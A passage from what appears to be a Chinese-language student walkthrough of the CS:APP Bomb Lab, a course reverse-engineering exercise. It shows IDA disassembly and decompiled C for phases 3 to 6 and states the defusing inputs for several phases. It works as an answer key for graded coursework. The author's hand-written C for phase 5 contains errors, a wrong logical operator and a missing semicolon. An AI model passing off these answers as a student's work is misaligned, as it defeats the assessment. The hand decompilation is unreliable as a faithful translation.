.text: 0000000000400 EFD lea rcx , [ rsp + 18 h + var_10 ] .text: 0000000000400 F02 lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000400 F07 mov esi , offset aDD ; \"%d %d\" .text: 0000000000400 F0C mov eax , 0 .text: 0000000000400 F11 call ___isoc99_sscanf .text: 0000000000400 F16 cmp eax , 1 .text: 0000000000400 F19 jg short loc_400F20 .text: 0000000000400 F1B call explode_bomb .text: 0000000000400 F20 ; --------------------------------------------------------------------------- .text: 0000000000400 F20 .text: 0000000000400 F20 loc_400F20 : ; CODE XREF: phase_3+20\u2191j .text: 0000000000400 F20 cmp [ rsp + 18 h + var_C ], 7 ; switch 8 cases .text: 0000000000400 F25 ja short loc_400F63 ; jumptable 0000000000400F2B default case .text: 0000000000400 F27 mov eax , [ rsp + 18 h + var_C ] .text: 0000000000400 F2B jmp ds : off_401B60 [ rax * 8 ] ; switch jump .text: 0000000000400 F32 ; --------------------------------------------------------------------------- .text: 0000000000400 F32 .text: 0000000000400 F32 loc_400F32 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F32 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F32 mov eax , 217 h ; jumptable 0000000000400F2B case 0 .text: 0000000000400 F37 jmp short loc_400F74 .text: 0000000000400 F39 ; --------------------------------------------------------------------------- .text: 0000000000400 F39 .text: 0000000000400 F39 loc_400F39 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F39 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F39 mov eax , 0 D6h ; jumptable 0000000000400F2B case 2 .text: 0000000000400 F3E jmp short loc_400F74 .text: 0000000000400 F40 ; --------------------------------------------------------------------------- .text: 0000000000400 F40 .text: 0000000000400 F40 loc_400F40 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F40 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F40 mov eax , 153 h ; jumptable 0000000000400F2B case 3 .text: 0000000000400 F45 jmp short loc_400F74 .text: 0000000000400 F47 ; --------------------------------------------------------------------------- .text: 0000000000400 F47 .text: 0000000000400 F47 loc_400F47 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F47 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F47 mov eax , 77 h ; jumptable 0000000000400F2B case 4 .text: 0000000000400 F4C jmp short loc_400F74 .text: 0000000000400 F4E ; --------------------------------------------------------------------------- .text: 0000000000400 F4E .text: 0000000000400 F4E loc_400F4E : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F4E ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F4E mov eax , 160 h ; jumptable 0000000000400F2B case 5 .text: 0000000000400 F53 jmp short loc_400F74 .text: 0000000000400 F55 ; --------------------------------------------------------------------------- .text: 0000000000400 F55 .text: 0000000000400 F55 loc_400F55 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F55 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F55 mov eax , 397 h ; jumptable 0000000000400F2B case 6 .text: 0000000000400 F5A jmp short loc_400F74 .text: 0000000000400 F5C ; --------------------------------------------------------------------------- .text: 0000000000400 F5C .text: 0000000000400 F5C loc_400F5C : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F5C ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F5C mov eax , 19 Ch ; jumptable 0000000000400F2B case 7 .text: 0000000000400 F61 jmp short loc_400F74 .text: 0000000000400 F63 ; --------------------------------------------------------------------------- .text: 0000000000400 F63 .text: 0000000000400 F63 loc_400F63 : ; CODE XREF: phase_3+2C\u2191j .text: 0000000000400 F63 call explode_bomb ; jumptable 0000000000400F2B default case .text: 0000000000400 F68 ; --------------------------------------------------------------------------- .text: 0000000000400 F68 mov eax , 0 .text: 0000000000400 F6D jmp short loc_400F74 .text: 0000000000400 F6F ; --------------------------------------------------------------------------- .text: 0000000000400 F6F .text: 0000000000400 F6F loc_400F6F : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F6F ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F6F mov eax , 39 Eh ; jumptable 0000000000400F2B case 1 .text: 0000000000400 F74 .text: 0000000000400 F74 loc_400F74 : ; CODE XREF: phase_3+3E\u2191j .text: 0000000000400 F74 ; phase_3+45\u2191j ... .text: 0000000000400 F74 cmp eax , [ rsp + 18 h + var_10 ] .text: 0000000000400 F78 jz short loc_400F7F .text: 0000000000400 F7A call explode_bomb .text: 0000000000400 F7F ; --------------------------------------------------------------------------- .text: 0000000000400 F7F .text: 0000000000400 F7F loc_400F7F : ; CODE XREF: phase_3+7F\u2191j .text: 0000000000400 F7F add rsp , 18 h .text: 0000000000400 F83 retn .text: 0000000000400 F83 ; } // starts at 400EF9 .text: 0000000000400 F83 phase_3 endp .text: 0000000000400 F83 Warning \u8df3\u8f6c\u8868\u5185\u7684\u5730\u5740\u7684\u201c\u987a\u5e8f\u201d\u4e0d\u603b\u662f\u548c\u4f60\u60f3\u8c61\u7684\u4e00\u6837\u3002:-) \u9644\u4e0a\u8df3\u8f6c\u8868\uff0c\u5404\u4f4d\u81ea\u884c\u5bf9\u7167\u7740\u4e0a\u9762\u770b\u5427\u3002 1 2 3 4 5 6 7 8 . rodata : 0000000000401 B60 off_401B60 dq offset loc_400F32 ; DATA XREF: phase_3+32\u2191r . rodata : 0000000000401 B60 dq offset loc_400F6F ; jump table for switch statement . rodata : 0000000000401 B60 dq offset loc_400F39 . rodata : 0000000000401 B60 dq offset loc_400F40 . rodata : 0000000000401 B60 dq offset loc_400F47 . rodata : 0000000000401 B60 dq offset loc_400F4E . rodata : 0000000000401 B60 dq offset loc_400F55 . rodata : 0000000000401 B60 dq offset loc_400F5C \u7efc\u4e0a\uff0c\u5f53\u524d\u5173\u5361\u9700\u8981\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u8fd9\u4e24\u4e2a\u6574\u6570\u9700\u8981\u4e3a\uff1a 1 2 3 4 5 6 7 8 0 535 1 926 2 214 3 339 4 119 5 352 6 919 7 412 \u4e2d\u7684\u4e00\u5bf9\uff0c\u5426\u5219\u5c06\u4f1a\u8c03\u7528 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002 \u6240\u4ee5\uff0c\u7ed9\u51fa\u4e0a\u8ff0\u6574\u6570\u5bf9\u4e2d\u7684\u4efb\u610f\u4e00\u5bf9\u5373\u53ef\u901a\u8fc7\u7b2c\u4e09\u4e2acheck\u3002","title":"phase_3()"},{"location":"szu_courses/csapp/bomb_lab/#phase_4","text":"\u7ee7\u7eed\u6b65\u8fdb\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall phase_4 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { __int64 v6 ; // rdi __int64 result ; // rax int v8 ; // [rsp+Ch] [rbp-Ch] if ( ( unsigned int ) __isoc99_sscanf ( a1 , 4202177LL , & v8 , a4 , a5 , a6 ) != 1 || v8 <= 0 ) explode_bomb ( a1 , 4202177LL ); v6 = ( unsigned int ) v8 ; result = func4 ( v8 , 4202177LL ); if ( ( _DWORD ) result != 55 ) explode_bomb ( v6 , 4202177LL ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 .text: 0000000000400 FC1 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 FC1 .text: 0000000000400 FC1 .text: 0000000000400 FC1 public phase_4 .text: 0000000000400 FC1 phase_4 proc near ; CODE XREF: main+E4\u2191p .text: 0000000000400 FC1 .text: 0000000000400 FC1 var_C = dword ptr - 0 Ch .text: 0000000000400 FC1 .text: 0000000000400 FC1 ; __unwind { .text: 0000000000400 FC1 sub rsp , 18 h .text: 0000000000400 FC5 lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000400 FCA mov esi , 401 EC1h .text: 0000000000400 FCF mov eax , 0 .text: 0000000000400 FD4 call ___isoc99_sscanf .text: 0000000000400 FD9 cmp eax , 1 .text: 0000000000400 FDC jnz short loc_400FE5 .text: 0000000000400 FDE cmp [ rsp + 18 h + var_C ], 0 .text: 0000000000400 FE3 jg short loc_400FEA .text: 0000000000400 FE5 .text: 0000000000400 FE5 loc_400FE5 : ; CODE XREF: phase_4+1B\u2191j .text: 0000000000400 FE5 call explode_bomb .text: 0000000000400 FEA ; --------------------------------------------------------------------------- .text: 0000000000400 FEA .text: 0000000000400 FEA loc_400FEA : ; CODE XREF: phase_4+22\u2191j .text: 0000000000400 FEA mov edi , [ rsp + 18 h + var_C ] .text: 0000000000400 FEE call func4 .text: 0000000000400 FF3 cmp eax , 37 h .text: 0000000000400 FF6 jz short loc_400FFD .text: 0000000000400 FF8 call explode_bomb .text: 0000000000400 FFD ; --------------------------------------------------------------------------- .text: 0000000000400 FFD .text: 0000000000400 FFD loc_400FFD : ; CODE XREF: phase_4+35\u2191j .text: 0000000000400 FFD add rsp , 18 h .text: 0000000000401001 retn .text: 0000000000401001 ; } // starts at 400FC1 .text: 0000000000401001 phase_4 endp .text: 0000000000401001 C, decompiled by me 1 2 3 4 5 6 7 8 9 void phase_4 () { int number ; if ( scanf ( \"%d\" , & number ) != 1 || number <= 0 ) { explode_bomb (); } if ( func4 ( number ) != 55 ) { explode_bomb (); } } \u8fd9\u770b\u8d77\u6765\u50cf\u662f\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\uff0c\u8ba9\u5b83\u7ecf\u8fc7 func4() \u8ba1\u7b97\u540e\u5f97\u5230 55 \uff0c\u5426\u5219\u5c31\u4f1a\u89e6\u53d1 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002\u6240\u4ee5\u6211\u4eec\u6765\u770b\u770b func4() \u91cc\u9762\u6709\u4ec0\u4e48\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 signed __int64 __fastcall func4 ( signed int a1 , __int64 a2 ) { signed __int64 result ; // rax int v3 ; // ebp result = 1LL ; if ( a1 > 1 ) { v3 = func4 (( unsigned int )( a1 - 1 ), a2 ); result = v3 + ( unsigned int ) func4 (( unsigned int )( a1 - 2 ), a2 ); } return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 .text: 0000000000400 F84 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 F84 .text: 0000000000400 F84 .text: 0000000000400 F84 public func4 .text: 0000000000400 F84 func4 proc near ; CODE XREF: func4+1D\u2193p .text: 0000000000400 F84 ; func4+27\u2193p ... .text: 0000000000400 F84 .text: 0000000000400 F84 var_10 = qword ptr - 10 h .text: 0000000000400 F84 var_8 = qword ptr - 8 .text: 0000000000400 F84 .text: 0000000000400 F84 ; __unwind { .text: 0000000000400 F84 mov [ rsp + var_10 ], rbx .text: 0000000000400 F89 mov [ rsp + var_8 ], rbp .text: 0000000000400 F8E sub rsp , 18 h .text: 0000000000400 F92 mov ebx , edi .text: 0000000000400 F94 mov eax , 1 .text: 0000000000400 F99 cmp edi , 1 .text: 0000000000400 F9C jle short loc_400FB2 .text: 0000000000400 F9E lea edi , [ rbx-1 ] .text: 0000000000400 FA1 call func4 .text: 0000000000400 FA6 mov ebp , eax .text: 0000000000400 FA8 lea edi , [ rbx-2 ] .text: 0000000000400 FAB call func4 .text: 0000000000400 FB0 add eax , ebp .text: 0000000000400 FB2 .text: 0000000000400 FB2 loc_400FB2 : ; CODE XREF: func4+18\u2191j .text: 0000000000400 FB2 mov rbx , [ rsp + 18 h + var_10 ] .text: 0000000000400 FB7 mov rbp , [ rsp + 18 h + var_8 ] .text: 0000000000400 FBC add rsp , 18 h .text: 0000000000400 FC0 retn .text: 0000000000400 FC0 ; } // starts at 400F84 .text: 0000000000400 FC0 func4 endp .text: 0000000000400 FC0 C, decompiled by me 1 2 3 4 5 6 int func4 ( int number ) { if ( number <= 1 ) { return 1 ; } return func4 ( number - 1 ) + func4 ( number - 2 ); } \u66f4\u65b0\uff1a\u4ee3\u7801\u66f4\u6b63\u4e86\u4e00\u4e0b\uff0c\u611f\u8c22\u63d0\u9192\u3002\u4f46\u6211\u8fd8\u662f\u5efa\u8bae\u770bIDA\u9006\u7684\u800c\u4e0d\u662f\u6211\u7684\u3002\u53e6\u5916\uff0c\u914d\u5408\u7740\u8c03\u8bd5\u6548\u679c\u66f4\u4f73\uff0c\u6709\u5173\u5982\u4f55\u8c03\u8bd5\u7684\u6587\u7ae0\u5df2\u7ecf\u53d1\u5e03\u3002 \u76f8\u5f53\u660e\u663e\u4e86\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u9012\u5f52\u8ba1\u7b97\u6590\u6ce2\u7eb3\u5951\u6570\u5217\u7684\u51fd\u6570\u3002 \u7efc\u4e0a\uff0c\u7531\u4e8e\u6590\u6ce2\u90a3\u5951\u6570\u5217\u662f\uff1a 1 2 3 5 8 13 21 34 55 \u6240\u4ee5\uff0c\u53ea\u8981\u7ed9\u5b9a\uff1a 1 9 \uff0c\u5373\u7b2c9\u4e2a\u6570\u5b57\uff0c\u5c31\u53ef\u901a\u8fc7\u7b2c\u56db\u4e2acheck\u3002","title":"phase_4()"},{"location":"szu_courses/csapp/bomb_lab/#phase_5","text":"\u7ee7\u7eed\u524d\u8fdb\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 __int64 __fastcall phase_5 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { __int64 result ; // rax int v7 ; // ecx int v8 ; // edx int v9 ; // [rsp+8h] [rbp-10h] int v10 ; // [rsp+Ch] [rbp-Ch] if ( ( signed int ) __isoc99_sscanf ( a1 , \"%d %d\" , & v10 , & v9 , a5 , a6 ) <= 1 ) explode_bomb ( a1 , \"%d %d\" ); LODWORD ( result ) = v10 & 0xF ; v10 = result ; if ( ( _DWORD ) result == 15 ) goto LABEL_11 ; v7 = 0 ; v8 = 0 ; do { ++ v8 ; result = ( unsigned int ) array_3014 [( signed int ) result ]; v7 += result ; } while ( ( _DWORD ) result != 15 ); v10 = 15 ; if ( v8 != 12 || v7 != v9 ) LABEL_11 : explode_bomb ( a1 , \"%d %d\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 .text: 0000000000401002 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401002 .text: 0000000000401002 .text: 0000000000401002 public phase_5 .text: 0000000000401002 phase_5 proc near ; CODE XREF: main+100\u2191p .text: 0000000000401002 .text: 0000000000401002 var_10 = dword ptr - 10 h .text: 0000000000401002 var_C = dword ptr - 0 Ch .text: 0000000000401002 .text: 0000000000401002 ; __unwind { .text: 0000000000401002 sub rsp , 18 h .text: 0000000000401006 lea rcx , [ rsp + 18 h + var_10 ] .text: 000000000040100 B lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000401010 mov esi , offset aDD ; \"%d %d\" .text: 0000000000401015 mov eax , 0 .text: 000000000040101 A call ___isoc99_sscanf .text: 000000000040101 F cmp eax , 1 .text: 0000000000401022 jg short loc_401029 .text: 0000000000401024 call explode_bomb .text: 0000000000401029 ; --------------------------------------------------------------------------- .text: 0000000000401029 .text: 0000000000401029 loc_401029: ; CODE XREF: phase_5+20\u2191j .text: 0000000000401029 mov eax , [ rsp + 18 h + var_C ] .text: 000000000040102 D and eax , 0 Fh .text: 0000000000401030 mov [ rsp + 18 h + var_C ], eax .text: 0000000000401034 cmp eax , 0 Fh .text: 0000000000401037 jz short loc_401065 .text: 0000000000401039 mov ecx , 0 .text: 000000000040103 E mov edx , 0 .text: 0000000000401043 .text: 0000000000401043 loc_401043: ; CODE XREF: phase_5+52\u2193j .text: 0000000000401043 add edx , 1 .text: 0000000000401046 cdqe .text: 0000000000401048 mov eax , ds : array_3014 [ rax * 4 ] .text: 000000000040104 F add ecx , eax .text: 0000000000401051 cmp eax , 0 Fh .text: 0000000000401054 jnz short loc_401043 .text: 0000000000401056 mov [ rsp + 18 h + var_C ], eax .text: 000000000040105 A cmp edx , 0 Ch .text: 000000000040105 D jnz short loc_401065 .text: 000000000040105 F cmp ecx , [ rsp + 18 h + var_10 ] .text: 0000000000401063 jz short loc_40106A .text: 0000000000401065 .text: 0000000000401065 loc_401065: ; CODE XREF: phase_5+35\u2191j .text: 0000000000401065 ; phase_5+5B\u2191j .text: 0000000000401065 call explode_bomb .text: 000000000040106 A ; --------------------------------------------------------------------------- .text: 000000000040106 A .text: 000000000040106 A loc_40106A : ; CODE XREF: phase_5+61\u2191j .text: 000000000040106 A add rsp , 18 h .text: 000000000040106 E retn .text: 000000000040106 E ; } // starts at 401002 .text: 000000000040106 E phase_5 endp .text: 000000000040106 E C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 int array [] = { 0xA , 0x2 , 0xE , 0x7 , 0x8 , 0xC , 0xF , 0xB , 0x0 , 0x4 , 0x1 , 0xD , 0x3 , 0x9 , 0x6 , 0x5 , }; void phase_5 () { int number1 , number2 ; if ( scanf ( \"%d %d\" , & number1 , & number2 ) <= 1 ) { explode_bomb (); } number1 = number1 & 0xF ; if ( number1 == 0xF ) { explode_bomb (); } int i = 0 , sum = 0 ; do { i += 1 ; number1 = array [ number1 ]; sum += number1 ; } while ( number1 != 0xF ) if ( i != 0xC && sum != number2 ) { explode_bomb (); } } array, raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 .rodata: 0000000000401 BA0 ; int array_3014[16] .rodata: 0000000000401 BA0 array_3014 dd 0 Ah ; DATA XREF: phase_5+46\u2191r .rodata: 0000000000401 BA4 db 2 .rodata: 0000000000401 BA5 db 0 .rodata: 0000000000401 BA6 db 0 .rodata: 0000000000401 BA7 db 0 .rodata: 0000000000401 BA8 db 0 Eh .rodata: 0000000000401 BA9 db 0 .rodata: 0000000000401 BAA db 0 .rodata: 0000000000401 BAB db 0 .rodata: 0000000000401 BAC db 7 .rodata: 0000000000401 BAD db 0 .rodata: 0000000000401 BAE db 0 .rodata: 0000000000401 BAF db 0 .rodata: 0000000000401 BB0 db 8 .rodata: 0000000000401 BB1 db 0 .rodata: 0000000000401 BB2 db 0 .rodata: 0000000000401 BB3 db 0 .rodata: 0000000000401 BB4 db 0 Ch .rodata: 0000000000401 BB5 db 0 .rodata: 0000000000401 BB6 db 0 .rodata: 0000000000401 BB7 db 0 .rodata: 0000000000401 BB8 db 0 Fh .rodata: 0000000000401 BB9 db 0 .rodata: 0000000000401 BBA db 0 .rodata: 0000000000401 BBB db 0 .rodata: 0000000000401 BBC db 0 Bh .rodata: 0000000000401 BBD db 0 .rodata: 0000000000401 BBE db 0 .rodata: 0000000000401 BBF db 0 .rodata: 0000000000401 BC0 db 0 .rodata: 0000000000401 BC1 db 0 .rodata: 0000000000401 BC2 db 0 .rodata: 0000000000401 BC3 db 0 .rodata: 0000000000401 BC4 db 4 .rodata: 0000000000401 BC5 db 0 .rodata: 0000000000401 BC6 db 0 .rodata: 0000000000401 BC7 db 0 .rodata: 0000000000401 BC8 db 1 .rodata: 0000000000401 BC9 db 0 .rodata: 0000000000401 BCA db 0 .rodata: 0000000000401 BCB db 0 .rodata: 0000000000401 BCC db 0 Dh .rodata: 0000000000401 BCD db 0 .rodata: 0000000000401 BCE db 0 .rodata: 0000000000401 BCF db 0 .rodata: 0000000000401 BD0 db 3 .rodata: 0000000000401 BD1 db 0 .rodata: 0000000000401 BD2 db 0 .rodata: 0000000000401 BD3 db 0 .rodata: 0000000000401 BD4 db 9 .rodata: 0000000000401 BD5 db 0 .rodata: 0000000000401 BD6 db 0 .rodata: 0000000000401 BD7 db 0 .rodata: 0000000000401 BD8 db 6 .rodata: 0000000000401 BD9 db 0 .rodata: 0000000000401 BDA db 0 .rodata: 0000000000401 BDB db 0 .rodata: 0000000000401 BDC db 5 .rodata: 0000000000401 BDD db 0 .rodata: 0000000000401 BDE db 0 .rodata: 0000000000401 BDF db 0 \u7136\u540e\u5c31\u53d1\u73b0\u81ea\u5df1\u9006\u7684\u8ddfIDA\u7684\u597d\u50cf\u5dee\u4e0d\u591a...\u73b0\u5728\u770b\u8d77\u6765\u5df2\u7ecf\u5f88\u660e\u786e\u4e86\uff0c\u9898\u76ee\u9884\u7f6e\u4e86\u4e00\u4e2a16\u4e2a\u6574\u6570\u7684\u6570\u7ec4\uff0c\u8981\u6c42\u8f93\u5165\u4e24\u4e2a\u6574\u6570\u3002 \u5176\u4e2d\uff0c\u4f1a\u5148\u53d6\u7b2c\u4e00\u4e2a\u6574\u6570\u7684\u4e8c\u8fdb\u5236\u7684\u540e4\u4f4d\uff0c\u4e5f\u5c31\u662f\u88ab\u622a\u65ad\u540e\u6700\u5927\u503c\u662f15\uff0c\u8fd9\u4e2a\u6570\u503c\u4f1a\u88ab\u5f53\u4f5c\u6570\u7ec4\u4e0b\u6807\u53bb\u67e5\u627e\u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u503c\uff0c\u968f\u540e\u7d2f\u52a0\u67e5\u627e\u5230\u7684\u503c\u3002\u5e76\u4e14\uff0c\u4f1a\u7528\u67e5\u627e\u5230\u7684\u503c\u7ee7\u7eed\u5f53\u4f5c\u6570\u7ec4\u4e0b\u6807\u53bb\u627e\u5230\u65b0\u7684\u503c\uff0c\u5982\u6b64\u5faa\u73af\uff0c\u76f4\u5230\u53d6\u5230 0xF \u65f6\u505c\u6b62\u3002 \u6ce8\u610f\u5230\uff0c\u505c\u6b62\u7684\u65f6\u5019\u8981\u6c42\u67e5\u627e\u4e8612\u6b21\uff0c\u5e76\u4e14\u6bcf\u6b21\u67e5\u627e\u5230\u7684\u503c\u7684\u7d2f\u52a0\u548c\u5e94\u5f53\u4e0e\u8f93\u5165\u7684\u7b2c\u4e8c\u4e2a\u6570\u76f8\u7b49\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4ece\u6570\u7ec4\u7684\u7b2c6\u4e2a\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u4e5f\u5c31\u662f 0xF \u5f00\u59cb\uff0c\u9006\u5411\u67e5\u627e\u56de\u53bb\uff0c\u4e8e\u662f\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u987a\u5e8f\u5e94\u8be5\u662f\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 array [ 7 ] ==> 0 xB ==> 11 array [ 11 ] ==> 0 xD ==> 13 array [ 13 ] ==> 0 x9 ==> 9 array [ 9 ] ==> 0 x4 ==> 4 array [ 4 ] ==> 0 x8 ==> 8 array [ 8 ] ==> 0 x0 ==> 0 array [ 0 ] ==> 0 xA ==> 10 array [ 10 ] ==> 0 x1 ==> 1 array [ 1 ] ==> 0 x2 ==> 2 array [ 2 ] ==> 0 xE ==> 14 array [ 14 ] ==> 0 x6 ==> 6 array [ 6 ] ==> 0 xF ==> 15 \u4e5f\u5c31\u662f\u8bf4\uff0c\u7b2c\u4e00\u4e2a\u6570\u5b57\u5e94\u5f53\u662f 7 \uff0c\u5e76\u4e14\uff0c\u7d2f\u52a0\u548c\u5e94\u5f53\u662f 93 \uff08\u6211\u5077\u5077\u52a0\u597d\u4e86\uff09\u3002\u6240\u4ee5\u7b2c\u4e94\u90e8\u5206\u7684flag\u662f\uff1a 1 7 93","title":"phase_5()"},{"location":"szu_courses/csapp/bomb_lab/#phase_6","text":"Congratulations! You've (mostly) defused the bomb! Hit Control-C to escape phase 6 (for free!), but if you want to try phase 6 for extra credit, you can continue. Just beware! \u770b\u8d77\u6765\u9898\u76ee\u8bf4\u7b2c\u516d\u5173\u662f\u9644\u52a0\u9898\uff1f\u8fd8\u662f\u6765\u770b\u770b\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 _DWORD * __fastcall phase_6 ( const char * a1 ) { _DWORD * result ; // rax node0 = strtol ( a1 , 0LL , 10 ); result = * ( _DWORD ** )( * ( _QWORD * )( * ( _QWORD * )( fun6 ( & node0 , 0LL ) + 8 ) + 8LL ) + 8LL ); if ( * result != node0 ) explode_bomb ( & node0 , 0LL ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 .text: 00000000004010 D9 ; =============== S U B R O U T I N E ======================================= .text: 00000000004010 D9 .text: 00000000004010 D9 .text: 00000000004010 D9 public phase_6 .text: 00000000004010 D9 phase_6 proc near ; CODE XREF: main+130\u2191p .text: 00000000004010 D9 ; __unwind { .text: 00000000004010 D9 sub rsp , 8 .text: 00000000004010 DD mov edx , 0 Ah ; base .text: 00000000004010 E2 mov esi , 0 ; endptr .text: 00000000004010 E7 call _strtol .text: 00000000004010 EC mov cs : node0 , eax .text: 00000000004010 F2 mov edi , offset node0 .text: 00000000004010 F7 call fun6 .text: 00000000004010 FC mov rax , [ rax + 8 ] .text: 0000000000401100 mov rax , [ rax + 8 ] .text: 0000000000401104 mov rax , [ rax + 8 ] .text: 0000000000401108 mov edx , cs : node0 .text: 000000000040110 E cmp [ rax ], edx .text: 0000000000401110 jz short loc_401117 .text: 0000000000401112 call explode_bomb .text: 0000000000401117 ; --------------------------------------------------------------------------- .text: 0000000000401117 .text: 0000000000401117 loc_401117: ; CODE XREF: phase_6+37\u2191j .text: 0000000000401117 add rsp , 8 .text: 000000000040111 B retn .text: 000000000040111 B ; } // starts at 4010D9 .text: 000000000040111 B phase_6 endp .text: 000000000040111 B node, raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 .data: 0000000000602780 public node0 .data: 0000000000602780 node0 dd 0 ; DATA XREF: phase_6+13\u2191w .data: 0000000000602780 ; phase_6+19\u2191o ... .data: 0000000000602784 align 8 .data: 0000000000602788 dq offset node1 .data: 0000000000602790 public node1 .data: 0000000000602790 node1 db 76 h ; v ; DATA XREF: .data:0000000000602788\u2191o .data: 0000000000602791 db 1 .data: 0000000000602792 db 0 .data: 0000000000602793 db 0 .data: 0000000000602794 db 1 .data: 0000000000602795 db 0 .data: 0000000000602796 db 0 .data: 0000000000602797 db 0 .data: 0000000000602798 db 0 A0h .data: 0000000000602799 db 27 h ; ' .data: 000000000060279 A db 60 h ; ` .data: 000000000060279 B db 0 .data: 000000000060279 C db 0 .data: 000000000060279 D db 0 .data: 000000000060279 E db 0 .data: 000000000060279 F db 0 .data: 00000000006027 A0 public node2 .data: 00000000006027 A0 node2 db 3 Ah ; : .data: 00000000006027 A1 db 3 .data: 00000000006027 A2 db 0 .data: 00000000006027 A3 db 0 .data: 00000000006027 A4 db 2 .data: 00000000006027 A5 db 0 .data: 00000000006027 A6 db 0 .data: 00000000006027 A7 db 0 .data: 00000000006027 A8 db 0 B0h .data: 00000000006027 A9 db 27 h ; ' .data: 00000000006027 AA db 60 h ; ` .data: 00000000006027 AB db 0 .data: 00000000006027 AC db 0 .data: 00000000006027 AD db 0 .data: 00000000006027 AE db 0 .data: 00000000006027 AF db 0 .data: 00000000006027 B0 public node3 .data: 00000000006027 B0 node3 db 72 h ; r .data: 00000000006027 B1 db 1 .data: 00000000006027 B2 db 0 .data: 00000000006027 B3 db 0 .data: 00000000006027 B4 db 3 .data: 00000000006027 B5 db 0 .data: 00000000006027 B6 db 0 .data: 00000000006027 B7 db 0 .data: 00000000006027 B8 db 0 C0h .data: 00000000006027 B9 db 27 h ; ' .data: 00000000006027 BA db 60 h ; ` .data: 00000000006027 BB db 0 .data: 00000000006027 BC db 0 .data: 00000000006027 BD db 0 .data: 00000000006027 BE db 0 .data: 00000000006027 BF db 0 .data: 00000000006027 C0 public node4 .data: 00000000006027 C0 node4 db 0 Eh .data: 00000000006027 C1 db 3 .data: 00000000006027 C2 db 0 .data: 00000000006027 C3 db 0 .data: 00000000006027 C4 db 4 .data: 00000000006027 C5 db 0 .data: 00000000006027 C6 db 0 .data: 00000000006027 C7 db 0 .data: 00000000006027 C8 db 0 D0h .data: 00000000006027 C9 db 27 h ; ' .data: 00000000006027 CA db 60 h ; ` .data: 00000000006027 CB db 0 .data: 00000000006027 CC db 0 .data: 00000000006027 CD db 0 .data: 00000000006027 CE db 0 .data: 00000000006027 CF db 0 .data: 00000000006027 D0 public node5 .data: 00000000006027 D0 node5 db 0 E8h .data: 00000000006027 D1 db 1 .data: 00000000006027 D2 db 0 .data: 00000000006027 D3 db 0 .data: 00000000006027 D4 db 5 .data: 00000000006027 D5 db 0 .data: 00000000006027 D6 db 0 .data: 00000000006027 D7 db 0 .data: 00000000006027 D8 db 0 E0h .data: 00000000006027 D9 db 27 h ; ' .data: 00000000006027 DA db 60 h ; ` .data: 00000000006027 